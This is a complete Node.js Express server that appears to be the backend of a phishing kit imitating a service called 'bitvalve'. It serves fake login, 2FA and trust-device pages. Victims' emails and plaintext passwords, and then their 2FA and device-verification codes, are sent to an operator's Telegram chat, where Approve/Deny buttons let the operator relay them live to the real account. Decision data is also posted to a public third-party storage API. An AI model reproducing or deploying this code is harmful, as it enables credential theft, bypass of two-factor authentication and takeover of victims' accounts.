require('dotenv').config();

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');
const os = require('os');

const app = express();
const port = Number(process.env.PORT || 3000);
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;
const isVercel = Boolean(process.env.VERCEL);

if (!botToken || !chatId) {
  console.error('Missing BOT_TOKEN or CHAT_ID in environment variables.');
}

const botOptions = isVercel ? {} : { polling: true };
const bot = botToken ? new TelegramBot(botToken, botOptions) : null;

// Persistent decision storage across Vercel serverless lambdas
const memoryStore = new Map();
const tmpFilePath = path.join(os.tmpdir(), 'bitvalve_decisions.json');

function readTmpFile() {
  try {
    if (fs.existsSync(tmpFilePath)) {
      return JSON.parse(fs.readFileSync(tmpFilePath, 'utf8'));
    }
  } catch (e) {}
  return {};
}

function writeTmpFile(data) {
  try {
    fs.writeFileSync(tmpFilePath, JSON.stringify(data), 'utf8');
  } catch (e) {}
}

async function saveDecision(key, decisionObj) {
  memoryStore.set(key, decisionObj);

  const tmpData = readTmpFile();
  tmpData[key] = decisionObj;
  writeTmpFile(tmpData);

  try {
    const cleanKey = key.replace(/[^a-zA-Z0-9_@-]/g, '_');
    await fetch('https://api.restful-api.dev/objects', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        name: `bv_dec_${cleanKey}`,
        data: decisionObj
      })
    });
  } catch (e) {
    console.error('Remote save decision failed:', e.message);
  }
}

async function deleteDecision(key) {
  memoryStore.delete(key);

  const tmpData = readTmpFile();
  delete tmpData[key];
  writeTmpFile(tmpData);
}

async function getDecision(key) {
  if (memoryStore.has(key)) {
    return memoryStore.get(key);
  }

  const tmpData = readTmpFile();
  if (tmpData[key]) {
    return tmpData[key];
  }

  try {
    const cleanKey = key.replace(/[^a-zA-Z0-9_@-]/g, '_');
    const res = await fetch(`https://api.restful-api.dev/objects?name=bv_dec_${cleanKey}`);
    if (res.ok) {
      const items = await res.json();
      if (Array.isArray(items) && items.length > 0) {
        const latest = items[items.length - 1];
        if (latest && latest.data) {
          memoryStore.set(key, latest.data);
          return latest.data;
        }
      }
    }
  } catch (e) {
    console.error('Remote get decision failed:', e.message);
  }

  return null;
}

app.use(express.json());
app.use(express.static(path.join(__dirname)));

async function handleCallbackQuery(query) {
  if (!query || !bot) return;
  const data = String(query.data || '');

  try {
    if (data.startsWith('approve:')) {
      const email = data.slice('approve:'.length);
      await saveDecision(`login:${email}`, { status: 'approved', message: 'Login approved.' });
      await bot.answerCallbackQuery(query.id, { text: 'Approved' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `✅ Login approved for ${email || 'user'}.`);
    }

    if (data.startsWith('deny:')) {
      const email = data.slice('deny:'.length);
      await saveDecision(`login:${email}`, { status: 'denied', message: 'Email or password is wrong.' });
      await bot.answerCallbackQuery(query.id, { text: 'Denied' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `❌ Login denied for ${email || 'user'}.`);
    }

    if (data.startsWith('verify:')) {
      const [, step, verificationEmail, verificationCode] = data.split(':');
      const key = `verify:${verificationEmail}:${step}`;
      await saveDecision(key, { status: 'approved', message: `${step.toUpperCase()} verified.` });
      await bot.answerCallbackQuery(query.id, { text: 'Verified' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `✅ ${step.toUpperCase()} verification approved for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
    }

    if (data.startsWith('reject:')) {
      const [, step, verificationEmail, verificationCode] = data.split(':');
      const key = `verify:${verificationEmail}:${step}`;
      await saveDecision(key, { status: 'denied', message: `${step.toUpperCase()} verification denied.` });
      await bot.answerCallbackQuery(query.id, { text: 'Rejected' });
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        { chat_id: query.message.chat.id, message_id: query.message.message_id }
      );
      await bot.sendMessage(query.message.chat.id, `❌ ${step.toUpperCase()} verification denied for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
    }
  } catch (error) {
    console.error('Callback processing failed:', error.message);
  }
}

if (!isVercel && bot) {
  bot.on('callback_query', handleCallbackQuery);
}

// Page Routes
app.get(['/', '/index.html'], (_req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get(['/login', '/login.html'], (_req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.get(['/2fa', '/2fa.html'], (_req, res) => {
  res.sendFile(path.join(__dirname, '2fa.html'));
});

app.get(['/trust-device', '/trust-device.html'], (_req, res) => {
  res.sendFile(path.join(__dirname, 'trust-device.html'));
});

// API Routes
app.post(['/api/login', '/login'], async (req, res) => {
  const email = String(req.body?.email || '').trim();
  const password = String(req.body?.password || '').trim();

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: 'Missing email or password.' });
  }

  await deleteDecision(`login:${email}`);

  if (!botToken || !chatId || !bot) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  const message = `Login request:\nEmail: ${email}\nPassword: ${password}`;

  try {
    const sentMessage = await bot.sendMessage(chatId, message, {
      reply_markup: {
        inline_keyboard: [[
          { text: 'Approve', callback_data: `approve:${email}` },
          { text: 'Deny', callback_data: `deny:${email}` }
        ]]
      }
    });

    return res.json({
      ok: true,
      messageId: sentMessage.message_id,
      email
    });
  } catch (error) {
    console.error('Failed to send login request:', error.message);
    return res.status(500).json({ ok: false, message: 'Could not send login request.' });
  }
});

app.post(['/api/telegram', '/telegram'], async (req, res) => {
  const update = req.body || {};
  if (update.callback_query) {
    try {
      await handleCallbackQuery(update.callback_query);
    } catch (error) {
      console.error('Webhook callback failed:', error.message);
    }
  }
  return res.status(200).json({ ok: true });
});

app.get(['/api/set-webhook', '/set-webhook'], async (req, res) => {
  if (!bot || !botToken) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  const host = req.headers['x-forwarded-host'] || req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'https';
  const webhookUrl = `${protocol}://${host}/api/telegram`;

  try {
    await bot.setWebHook(webhookUrl);
    return res.json({ ok: true, message: `Webhook successfully set to ${webhookUrl}` });
  } catch (error) {
    console.error('Failed to set webhook:', error.message);
    return res.status(500).json({ ok: false, message: error.message });
  }
});

app.get(['/api/login-status', '/login-status'], async (req, res) => {
  const email = String(req.query.email || '').trim();

  if (!email) {
    return res.status(400).json({ ok: false, message: 'Missing email.' });
  }

  const decision = await getDecision(`login:${email}`);

  if (!decision) {
    return res.json({ ok: true, status: 'pending' });
  }

  return res.json({ ok: true, status: decision.status, message: decision.message });
});

app.post(['/api/send-verification', '/send-verification'], async (req, res) => {
  const email = String(req.body?.email || '').trim();
  const step = String(req.body?.step || '').trim();
  const code = String(req.body?.code || '').trim();

  if (!email || !step || !code) {
    return res.status(400).json({ ok: false, message: 'Missing email, step, or code.' });
  }

  if (!botToken || !chatId || !bot) {
    return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
  }

  await deleteDecision(`verify:${email}:${step}`);

  const subject = step === '2fa' ? '2FA code verification' : 'new device verification';
  const message = `Security validation required\n\nEmail: ${email}\nStep: ${subject}\nCode: ${code}\n\nApprove or reject this verification request.`;

  try {
    const sentMessage = await bot.sendMessage(chatId, message, {
      reply_markup: {
        inline_keyboard: [[
          { text: 'Approve', callback_data: `verify:${step}:${email}:${code}` },
          { text: 'Reject', callback_data: `reject:${step}:${email}:${code}` }
        ]]
      }
    });

    return res.json({ ok: true, messageId: sentMessage.message_id, email, step, status: 'pending' });
  } catch (error) {
    console.error('Failed to send verification request:', error.message);
    return res.status(500).json({ ok: false, message: 'Could not send verification request.' });
  }
});

app.get(['/api/verification-status', '/verification-status'], async (req, res) => {
  const email = String(req.query.email || '').trim();
  const step = String(req.query.step || '').trim();

  if (!email || !step) {
    return res.status(400).json({ ok: false, message: 'Missing email or step.' });
  }

  const decision = await getDecision(`verify:${email}:${step}`);

  if (!decision) {
    return res.json({ ok: true, status: 'pending' });
  }

  return res.json({ ok: true, status: decision.status, message: decision.message });
});

app.get('/health', (_req, res) => {
  res.json({ ok: true });
});

if (require.main === module && !isVercel) {
  app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
  });
}

module.exports = app;
